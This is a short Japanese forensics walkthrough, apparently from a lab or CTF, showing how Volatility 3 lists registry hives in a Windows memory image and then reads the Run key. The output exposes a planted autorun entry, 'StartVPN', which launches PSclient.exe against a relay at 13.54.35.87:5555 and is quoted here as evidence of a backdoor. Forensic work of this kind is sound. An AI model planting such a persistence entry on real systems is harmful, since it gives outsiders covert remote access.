1．エントリーキーの永続化調査
レジストリは、いくつかの Windows オペレーティング システムに共通していますが、それらの間にいくつかの違いがあります。 
レジストリ ハイブは、データのバックアップを含む一連のサポート ファイルを含む、レジストリ内のキー、サブキー、および値のグループ

つまり、レジストリに設定された内容も調べることが可能。
スタートアップに設定されたバックドアを調べるには、メモリイメージからハイブリストのsoftwareのメモリ情報取得する。
$ python3 vol.py -f  /ShareVM/memory.raw hivelist
Volatility 3 Framework 2.11.0
Progress:  100.00               PDB scanning finished                        
Offset  FileFullPath    File output

0xd40ca4810000          Disabled
0xd40ca484c000  \REGISTRY\MACHINE\SYSTEM        Disabled
0xd40ca48d8000  \REGISTRY\MACHINE\HARDWARE      Disabled
0xd40ca7037000  \Device\HarddiskVolume1\Boot\BCD        Disabled
0xd40ca703d000  \SystemRoot\System32\Config\SOFTWARE    Disabled
0xd40ca8269000  \SystemRoot\System32\Config\DEFAULT     Disabled
0xd40ca8341000  \SystemRoot\System32\Config\SECURITY    Disabled

softwareのレジストリキーの中にMicrosoft\Windows\CurrentVersion\Runが存在し、これが起動時に実行されるものが配置される。
例だと、オフセットは「0xd40ca703d000」であるから下記のように検索すると、

$ python3 vol.py -f  /ShareVM/memory.raw printkey --offset 0xd40ca703d000 --key "Microsoft\Windows\CurrentVersion\Run" 
Volatility 3 Framework 2.11.0
Progress:  100.00               PDB scanning finished                        
Last Write Time Hive Offset     Type    Key     Name    Data    Volatile

2021-04-06 01:01:27.000000 UTC  0xd40ca703d000  REG_EXPAND_SZ   \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows\CurrentVersion\Run       SecurityHealth  "%windir%\system32\SecurityHealthSystray.exe"   False
2021-04-06 01:01:27.000000 UTC  0xd40ca703d000  REG_SZ  \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows\CurrentVersion\Run       StartVPN        "C:\Users\Public\PSclient.exe -autorestart -relayserver 13.54.35.87:5555"       False
 
このようにVPNが張られる通信が発生するように仕込まれているのがわかる。  
